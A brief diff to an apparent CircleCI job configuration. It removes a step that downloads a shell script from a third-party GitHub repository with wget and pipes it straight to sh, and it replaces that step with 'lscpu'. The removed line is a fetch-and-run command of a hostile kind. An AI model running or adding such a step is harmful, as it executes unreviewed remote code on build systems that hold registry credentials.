@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
+      - run:  lscpu
